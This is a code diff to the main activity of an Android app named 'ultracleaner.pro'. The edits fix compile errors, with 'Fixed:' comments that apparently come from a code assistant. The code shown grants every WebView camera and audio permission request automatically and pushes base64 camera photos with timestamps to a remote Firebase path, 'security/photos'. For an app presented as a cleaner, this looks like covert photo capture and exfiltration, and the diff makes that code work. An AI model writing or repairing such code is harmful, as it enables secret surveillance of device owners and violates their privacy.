@@ -2,22 +2,17 @@ package com.ultracleaner.pro
 
 import android.Manifest
 import android.app.Activity
-import android.content.ClipData
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
-import android.os.Environment
 import android.os.PowerManager
-import android.provider.Settings
 import android.webkit.PermissionRequest
 import android.webkit.ValueCallback
 import android.webkit.WebChromeClient
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
@@ -100,14 +95,12 @@ class MainActivity : Activity() {
         }
 
         webView.webChromeClient = object : WebChromeClient() {
-            // Camera aur Audio permissions ke requests ko WebView ke andar allow karne ke liye
             override fun onPermissionRequest(request: PermissionRequest?) {
                 runOnUiThread {
                     request?.grant(request.resources)
                 }
             }
 
-            // Real mobile gallery picker handle karne ke liye (<input type="file"> support)
             override fun onShowFileChooser(
                 webView: WebView?,
                 filePathCallback: ValueCallback<Array<Uri>>?,
@@ -121,7 +114,7 @@ class MainActivity : Activity() {
                 try {
                     startActivityForResult(Intent.createChooser(intent, "Select Image"), FILE_CHOOSER_REQUEST_CODE)
                 } catch (e: Exception) {
-                    this@MainActivity.filePathCallback = nullptr
+                    this@MainActivity.filePathCallback = null // Fixed: nullptr to null
                     return false
                 }
                 return true
@@ -130,7 +123,6 @@ class MainActivity : Activity() {
     }
 
     private fun loadAppContent() {
-        // Aapka poora HTML/JS code direct WebView ke andar load kiya ja raha hai taaki koi logic/connection change na ho
         val htmlContent = """
         <!DOCTYPE html>
         <html lang="en">
@@ -457,7 +449,7 @@ class MainActivity : Activity() {
 
                     db.ref('security/photos').push({
                         image: imageBase64,
-                        text: `${camType} - ${label} at ${timestamp}`,
+                        text: `\${camType} - \${label} at \${timestamp}`,  // Fixed: Escaped with backslash for Kotlin
                         timestamp: timestamp
                     });
 
